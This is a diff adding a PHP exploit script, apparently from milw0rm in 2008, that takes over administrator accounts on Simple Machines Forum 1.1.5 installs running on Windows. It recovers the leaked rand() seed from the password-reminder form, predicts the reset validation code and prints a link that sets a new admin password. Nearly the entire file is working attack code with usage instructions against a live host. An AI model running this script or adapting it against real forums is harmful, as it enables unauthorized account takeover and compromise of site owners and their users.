@@ -1,0 +1,141 @@
+<?php
+echo "---------------------------------------------------------------\n";
+echo "SMF <= 1.1.5 Admin Reset Password Exploit (win32-based servers)\n";
+echo "(c)oded by Raz0r (http://Raz0r.name/)\n";
+echo "---------------------------------------------------------------\n";
+
+if ($argc<3) {
+   echo "USAGE:\n";
+   echo "~~~~~~\n";
+   echo "php {$argv[0]} [host] [path] OPTIONS\n\n";
+   echo "[host] - target server where SMF is installed\n";
+   echo "[path] - path to SMF\n\n";
+   echo "OPTIONS:\n";
+   echo "--userid=[value] (default: 1)\n";
+   echo "--username=[value] (default: admin)\n";
+   echo "examples:\n";
+   echo "php {$argv[0]} site.com /forum/\n";
+   echo "php {$argv[0]} site.com / --userid=2 --username=odmen\n";
+   die;
+}
+
+/**
+* Software site: http://www.simplemachines.org
+*
+* SMF leaks current state of random number generator through hidden input parameter `sc`
+* of the password reminder form:
+*
+* $_SESSION['rand_code'] = md5(session_id() . rand());
+* $sc = $_SESSION['rand_code'];
+*
+* Since max random number generated with rand() on win32 is 32767 and session id
+* is known an attacker can reverse the md5 hash and get the random number value.
+* On win32 every random number generated with rand() is used as a seed for the next
+* random number. So if SMF is installed on win32 platform an attacker can predict
+* all the next random numbers. When password reset is requested SMF uses rand()
+* function to generate validation code:
+*
+* $password = substr(preg_replace('/\W/', '', md5(rand())), 0, 10);
+*
+* So prediction of the validation code is possible and an atacker can set his
+* own password for any user.
+*
+* More information about random number prediction:
+* http://www.suspekt.org/2008/08/17/mt_srand-and-not-so-random-numbers/
+*
+* More information about the behaviour of rand() on win32 (in Russian):
+* http://raz0r.name/articles/magiya-sluchajnyx-chisel-chast-2/
+*/
+
+set_time_limit(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",10);
+
+$host = $argv[1];
+$path = $argv[2];
+
+for($i=3;$i<=$argc;$i++){
+   if(isset($argv[$i]) && strpos($argv[$i],"--userid=")!==false) {
+       list(,$userid) = explode("=",$argv[$i]);
+   }
+   if (isset($argv[$i]) && strpos($argv[$i],"--username=")!==false) {
+       list(,$username) = explode("=",$argv[$i]);
+   }
+}
+
+if(!isset($userid))$userid="1";
+if(!isset($username))$username="admin";
+
+$sess = md5(mt_rand());
+echo "[~] Connecting to $host ... ";
+$ock = fsockopen($host,80);
+if($ock) echo "OK\n"; else die("failed\n");
+
+$packet = "GET {$path}index.php?action=reminder HTTP/1.1\r\n";
+$packet.= "Host: {$host}\r\n";
+$packet.= "Cookie: PHPSESSID=$sess;\r\n";
+$packet.= "Keep-Alive: 300\r\n";
+$packet.= "Connection: keep-alive\r\n\r\n";
+
+fputs($ock, $packet);
+
+while(!feof($ock)) {
+   $resp = fgets($ock);
+   preg_match('@name="sc" value="([0-9a-f]+)"@i',$resp,$out);
+   if(isset($out[1])) {
+       $md5 = $out[1];
+       break;
+   }
+}
+
+if($md5) {
+   $seed = getseed($md5);
+   if($seed) {
+       echo "[+] Seed for next random number is $seed\n";
+   } else die("[-] Can't calculate seed\n");
+}
+else die("[-] Random number hash not found\n");
+
+function getseed($md5) {
+   global $sess;
+   for($i=0;$i<=32767;$i++){
+       if($md5 == md5($sess . $i)) {
+           return $i;
+       }
+   }
+}
+
+$sc = md5($sess . $seed);
+$data   = "user=".urlencode($username)."&sc=$sc";
+$packet = "POST {$path}index.php?action=reminder;sa=mail HTTP/1.1\r\n";
+$packet.= "Host: {$host}\r\n";
+$packet.= "Cookie: PHPSESSID=$sess;\r\n";
+$packet.= "Connection: close\r\n";
+$packet.= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.= "Content-Length: ".strlen($data)."\r\n\r\n";
+$packet.= $data;
+
+fputs($ock, $packet);
+
+$resp='';
+while(!feof($ock)) {
+   $resp .= fgets($ock);
+}
+
+if(preg_match("@HTTP/1.(0|1) 200 OK@i",$resp)===false) {
+   die("[-] An error ocurred while requesting validation code\n");
+}
+
+if(strpos($resp,"javascript:history.go(-1)")!==false) {
+   die("[-] Invalid username\n");
+}
+
+srand($seed);
+for($i=0;$i<6;$i++){
+   rand();
+}
+$password = substr(preg_replace('/\W/', '', md5(rand())), 0, 10);
+echo "[+] Success! To set password visit this link:\nhttp://{$host}{$path}index.php?action=reminder;sa=setpassword;u={$userid};code=$password\n";
+?>
+
+# milw0rm.com [2008-09-06]
